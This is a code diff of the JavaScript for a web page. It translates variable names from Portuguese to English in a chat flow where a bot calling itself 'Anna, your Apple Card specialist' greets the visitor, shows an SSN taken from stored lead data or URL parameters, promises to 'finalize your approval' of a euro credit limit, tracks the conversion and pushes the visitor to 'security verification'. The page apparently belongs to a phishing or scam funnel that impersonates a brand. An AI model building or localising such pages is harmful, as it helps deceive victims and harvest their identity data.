@@ -147,10 +147,10 @@
         /* ── Data ── */
         const data=LeadData.load();
         const params=new URLSearchParams(window.location.search);
-        const userName=data.nome||params.get('nome')||'Guest';
+        const userName=data.name||params.get('name')||'Guest';
         const firstName=userName.split(' ')[0];
         const rawSsn=data.ssn||params.get('ssn')||'';
-        const limite=data.limite_aprovado||parseInt(params.get('limite'))||5000;
+        const limit=data.approved_limit||parseInt(params.get('limit'))||5000;
 
         document.getElementById('headerName').textContent=firstName;
         document.getElementById('headerSsn').textContent=maskSsn(rawSsn);
@@ -262,7 +262,7 @@
         var steps=[
             /* 0 — Greeting + first question */
             function(){
-                var lf=limite.toLocaleString('de-DE');
+                var lf=limit.toLocaleString('de-DE');
                 botSequence([
                     'Hi, '+firstName+'! \ud83d\udc4b',
                     'I\'m <b>Anna</b>, your Apple Card specialist. I\'ll help you personalize everything and finalize your approval.',
@@ -320,7 +320,7 @@
             /* 4 — Summary + redirect */
             function(){
                 var cc=colorMap[selectedColor];
-                var lf=limite.toLocaleString('de-DE');
+                var lf=limit.toLocaleString('de-DE');
                 botSequence([
                     'Beautiful! The <b>'+cc.label+'</b> looks perfect with your name, '+firstName+'! \ud83d\ude0d'
                 ],function(){
@@ -343,7 +343,7 @@
                                     'All set! Now let\'s do the security verification. Just a few more steps! \ud83d\ude80'
                                 ],function(){
                                     LeadData.update({chat_completed:true});
-                                    if (window.track) window.track('Chat_Completed', { value: limite, currency:'EUR', card_color: selectedColor });
+                                    if (window.track) window.track('Chat_Completed', { value: limit, currency:'EUR', card_color: selectedColor });
                                     optionsArea.classList.remove('hidden');
                                     optionsArea.innerHTML='<button class="action-btn" onclick="goNext()">Continue to verification \u2192</button>';
                                 });
